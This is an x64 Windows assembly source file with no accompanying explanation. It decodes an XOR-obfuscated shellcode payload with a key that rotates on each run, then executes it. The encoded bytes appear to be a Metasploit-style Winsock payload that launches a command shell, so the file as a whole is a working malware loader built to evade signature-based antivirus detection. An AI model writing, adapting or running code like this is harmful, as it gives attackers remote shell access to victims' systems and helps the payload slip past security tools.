global WinMain

section .text

	key db 0xAA

WinMain:
	mov al, [rel key] ;old key
	mov bl, al
	add bl, 0x03 ;new key
	xor al, bl ;transition key
	mov [rel key], bl ;saving key
	mov bl, 0x01 ;setting flag for jump to dump
	jmp short call_decoder

xoring:
	pop rsi
	xor rcx, rcx
	mov cx, 0x1cc ; loop is based on cx , decrements with every iteration , breaks at 0.
decode:
	xor byte [rsi], al
	inc rsi
	loop decode

	cmp bl, 0x01
	jne Shellcode
	jmp dump_disk

call_decoder:
	call xoring
Shellcode: 
	db 0x56, 0xe2, 0x29, 0x4e, 0x5a, 0x42, 0x6a, 0xaa, 0xaa, 0xaa, 0xeb, 0xfb, 0xeb, 0xfa, 0xf8, 0xfb, 0xfc, 0xe2, 0x9b, 0x78, 0xcf, 0xe2, 0x21, 0xf8, 0xca, 0xe2, 0x21, 0xf8, 0xb2, 0xe2, 0x21, 0xf8, 0x8a, 0xe2, 0x21, 0xd8, 0xfa, 0xe2, 0xa5, 0x1d, 0xe0, 0xe0, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a, 0x06, 0x96, 0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x48, 0x47, 0xf8, 0xeb, 0xfb, 0xe2, 0x21, 0xf8, 0x8a, 0x21, 0xe8, 0x96, 0xe2, 0xab, 0x7a, 0x21, 0x2a, 0x22, 0xaa, 0xaa, 0xaa, 0xe2, 0x2f, 0x6a, 0xde, 0xcd, 0xe2, 0xab, 0x7a, 0xfa, 0x21, 0xe2, 0xb2, 0xee, 0x21, 0xea, 0x8a, 0xe3, 0xab, 0x7a, 0x49, 0xfc, 0xe2, 0x55, 0x63, 0xeb, 0x21, 0x9e, 0x22, 0xe2, 0xab, 0x7c, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a, 0x06, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x92, 0x4a, 0xdf, 0x5b, 0xe6, 0xa9, 0xe6, 0x8e, 0xa2, 0xef, 0x93, 0x7b, 0xdf, 0x72, 0xf2, 0xee, 0x21, 0xea, 0x8e, 0xe3, 0xab, 0x7a, 0xcc, 0xeb, 0x21, 0xa6, 0xe2, 0xee, 0x21, 0xea, 0xb6, 0xe3, 0xab, 0x7a, 0xeb, 0x21, 0xae, 0x22, 0xe2, 0xab, 0x7a, 0xeb, 0xf2, 0xeb, 0xf2, 0xf4, 0xf3, 0xf0, 0xeb, 0xf2, 0xeb, 0xf3, 0xeb, 0xf0, 0xe2, 0x29, 0x46, 0x8a, 0xeb, 0xf8, 0x55, 0x4a, 0xf2, 0xeb, 0xf3, 0xf0, 0xe2, 0x21, 0xb8, 0x43, 0xfd, 0x55, 0x55, 0x55, 0xf7, 0xe3, 0x14, 0xdd, 0xd9, 0x98, 0xf5, 0x99, 0x98, 0xaa, 0xaa, 0xeb, 0xfc, 0xe3, 0x23, 0x4c, 0xe2, 0x2b, 0x46, 0x0a, 0xab, 0xaa, 0xaa, 0xe3, 0x23, 0x4f, 0xe3, 0x16, 0xa8, 0xaa, 0x89, 0x83, 0x6a, 0x02, 0xab, 0x21, 0xeb, 0xfe, 0xe3, 0x23, 0x4e, 0xe6, 0x23, 0x5b, 0xeb, 0x10, 0xe6, 0xdd, 0x8c, 0xad, 0x55, 0x7f, 0xe6, 0x23, 0x40, 0xc2, 0xab, 0xab, 0xaa, 0xaa, 0xf3, 0xeb, 0x10, 0x83, 0x2a, 0xc1, 0xaa, 0x55, 0x7f, 0xfa, 0xfa, 0xe7, 0x9b, 0x63, 0xe7, 0x9b, 0x6a, 0xe2, 0x55, 0x6a, 0xe2, 0x23, 0x68, 0xe2, 0x55, 0x6a, 0xe2, 0x23, 0x6b, 0xeb, 0x10, 0x40, 0xa5, 0x75, 0x4a, 0x55, 0x7f, 0xe2, 0x23, 0x6d, 0xc0, 0xba, 0xeb, 0xf2, 0xe6, 0x23, 0x48, 0xe2, 0x23, 0x53, 0xeb, 0x10, 0x33, 0x0f, 0xde, 0xcb, 0x55, 0x7f, 0xe2, 0x2b, 0x6e, 0xea, 0xa8, 0xaa, 0xaa, 0xe3, 0x12, 0xc9, 0xc7, 0xce, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xeb, 0xfa, 0xeb, 0xfa, 0xe2, 0x23, 0x48, 0xfd, 0xfd, 0xfd, 0xe7, 0x9b, 0x6a, 0xc0, 0xa7, 0xf3, 0xeb, 0xfa, 0x48, 0x56, 0xcc, 0x6d, 0xee, 0x8e, 0xfe, 0xab, 0xab, 0xe2, 0x27, 0xee, 0x8e, 0xb2, 0x6c, 0xaa, 0xc2, 0xe2, 0x23, 0x4c, 0xfc, 0xfa, 0xeb, 0xfa, 0xeb, 0xfa, 0xeb, 0xfa, 0xe3, 0x55, 0x6a, 0xeb, 0xfa, 0xe3, 0x55, 0x62, 0xe7, 0x23, 0x6b, 0xe6, 0x23, 0x6b, 0xeb, 0x10, 0xd3, 0x66, 0x95, 0x2c, 0x55, 0x7f, 0xe2, 0x9b, 0x78, 0xe2, 0x55, 0x60, 0x21, 0xa4, 0xeb, 0x10, 0xa2, 0x2d, 0xb7, 0xca, 0x55, 0x7f, 0x11, 0x00, 0x6f, 0x48, 0xf7, 0xeb, 0x10, 0x0c, 0x3f, 0x17, 0x37, 0x55, 0x7f, 0xe2, 0x29, 0x6e, 0x82, 0x96, 0xac, 0xd6, 0xa0, 0x2a, 0x51, 0x4a, 0xdf, 0xaf, 0x11, 0xed, 0xb9, 0xd8, 0xc5, 0xc0, 0xaa, 0xf3, 0xeb, 0x23, 0x70, 0x55, 0x7f 
	jmp Shellcode
dump_disk:
	xor bl, bl; setting flag for jump to run
	mov al, [rel key];current key
	jmp call_decoder
	
